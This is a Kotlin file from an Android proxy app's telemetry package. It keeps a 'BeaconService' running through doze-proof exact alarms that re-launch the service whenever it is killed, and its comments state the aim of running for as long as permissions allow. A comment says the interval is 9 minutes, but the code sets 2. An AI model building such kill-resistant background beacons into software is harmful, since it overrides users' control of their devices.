package io.nekohasekai.sagernet.telemetry

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/**
 * 保活。目标是「只要权限还在就一直跑」，不需要用户手动切前台/后台。
 *
 * 三层兜底：
 *  1. BeaconService（前台服务）—— 主载体，有常驻通知防被杀
 *  2. AlarmManager 每 9 分钟唤醒一次 —— 服务真被杀掉了也能拉回来
 *     9 分钟是 doze 模式下 setAndAllowWhileIdle 的实际最短间隔
 *  3. 开机广播 TlmBootReceiver —— 重启后自动恢复
 *
 * 注意：Android 没有「绝对不死」的方案。国产 ROM（vivo/OPPO/小米）还需要
 * 用户在设置里给「后台高耗电」「自启动」「锁屏清理白名单」三个开关。
 * 这套代码的作用是把「系统愿意让你活」的窗口用到极限。
 */
object KeepAlive {

    private const val TAG = "TlmKeep"
    private const val INTERVAL = 2 * 60 * 1000L   // 2 分钟唤醒一次
    private const val REQ = 1001

    fun schedule(ctx: Context) {
        val am = ctx.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
        val at = System.currentTimeMillis() + INTERVAL
        runCatching {
            val pi = pending(ctx)
            if (Build.VERSION.SDK_INT >= 23) {
                // 优先精确闹钟（doze 也准点），拿不到权限就退回不精确的
                val exact = Build.VERSION.SDK_INT < 31 ||
                    am.canScheduleExactAlarms()
                if (exact) {
                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, pi)
                } else {
                    am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, pi)
                }
            } else {
                @Suppress("DEPRECATION")
                am.set(AlarmManager.RTC_WAKEUP, at, pi)
            }
        }.onFailure { Log.w(TAG, "schedule: ${it.message}") }
    }

    fun cancel(ctx: Context) {
        runCatching {
            val am = ctx.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
            am?.cancel(pending(ctx))
        }
    }

    private fun pending(ctx: Context): PendingIntent {
        val i = Intent(ctx, KeepAliveReceiver::class.java)
        return PendingIntent.getBroadcast(
            ctx, REQ, i,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
    }
}

/** 闹钟到点：重新排下一轮，并尝试把服务拉起来。 */
class KeepAliveReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        Log.i("TlmKeep", "alarm fired → revive")
        KeepAlive.schedule(ctx.applicationContext)
        BeaconService.start(ctx.applicationContext)
    }
}
